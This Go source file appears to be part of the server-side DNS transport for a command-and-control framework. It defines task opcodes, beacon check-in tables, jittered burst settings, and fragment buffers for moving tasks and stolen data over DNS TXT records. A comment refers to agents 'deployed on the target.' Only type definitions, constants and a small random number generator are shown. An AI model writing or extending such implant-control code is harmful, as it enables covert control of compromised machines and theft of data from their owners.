package main

import (
	"sync"
	"time"
)

// --- Configuration ---

type DNSConfig struct {
	HostBind     string `json:"host_bind"`
	PortBind     int    `json:"port_bind"`
	Domain       string `json:"domain"`
	PktSize      int    `json:"pkt_size"`
	TTL          int    `json:"ttl"`
	BurstEnabled bool   `json:"burst_enabled"`
	BurstSleep   int    `json:"burst_sleep"`
	BurstJitter  int    `json:"burst_jitter"`

	Protocol string `json:"protocol"`
	Domains  []string
}

// --- Constants ---

const (
	TASK_GET    byte = 0
	TASK_RESULT byte = 1
	TASK_QUICK  byte = 0x5
	TASK_OUT    byte = 0x7

	seqXorMask      uint32 = 0x39913991
	maxUploadSize   uint32 = 0x200000 // 2MB
	maxDownloadSize uint32 = 0x12c0000
	// dnsSafeChunkSize is the max payload size (before the 8-byte frame
	// header) we encode per DNS response during downloads. The beacon's
	// DnsQueryTXTRecord concatenates every TXT sub-string across every
	// TXT RR in a response into a single caller-provided buffer of
	// 1024 bytes (Dns.cc line ~434, KhAlloc(1024) passed as outMax).
	// Base64 expansion 4/3: raw-binary ceiling = 1024*3/4 = 768 bytes.
	// Minus the 8-byte [total:4][offset:4] frame header = 760 bytes of
	// usable payload. Picking 760 puts us at the architectural maximum
	// for existing deployed beacons (~2.7x the old 280). To go higher,
	// the beacon RX buffer at Dns.cc:434 must be raised in sync AND a
	// fresh agent re-deployed on the target.
	dnsSafeChunkSize       = 760
	defaultChunkSize       = 1024
)

// --- Fragment Buffers ---

type dnsFragBuf struct {
	buf            []byte
	total          uint32
	filled         uint32
	highWater      uint32
	chunkSize      uint32
	expectedOff    uint32
	lastReceivedOff uint32
	nextExpectedOff uint32
	seenOffsets    map[uint32]bool
	lastUpdate     time.Time
}

func newFragBuf(total uint32) *dnsFragBuf {
	return &dnsFragBuf{
		buf:         make([]byte, total),
		total:       total,
		seenOffsets: make(map[uint32]bool),
		lastUpdate:  time.Now(),
	}
}

type dnsDownBuf struct {
	buf        []byte
	total      uint32
	off        uint32
	taskNonce  uint32
	lastUpdate time.Time
}

func newDownBuf(data []byte, nonce uint32) *dnsDownBuf {
	return &dnsDownBuf{
		buf:        data,
		total:      uint32(len(data)),
		off:        0,
		taskNonce:  nonce,
		lastUpdate: time.Now(),
	}
}

// --- PUT ACK ---

type putAckInfo struct {
	complete        bool
	needsReset      bool
	total           uint32
	filled          uint32
	lastReceivedOff uint32
	nextExpectedOff uint32
}

// --- DNS Request ---

type dnsRequest struct {
	sid   string
	op    string
	seq   int
	data  []byte
	qtype uint16
	qname string
}

// --- Transport ---

type TransportDNS struct {
	Config DNSConfig
	Name   string
	Active bool

	mu             sync.Mutex
	upFrags        map[string]*dnsFragBuf
	downFrags      map[string]*dnsDownBuf
	pendingCheckins map[string][]byte
	needsReset     map[string]bool

	rng *rng
}

type rng struct{ state uint64 }

func newRng() *rng { return &rng{state: uint64(time.Now().UnixNano())} }
func (r *rng) IntN(n int) int {
	r.state = r.state*6364136223846793005 + 1442695040888963407
	return int((r.state >> 33) % uint64(n))
}
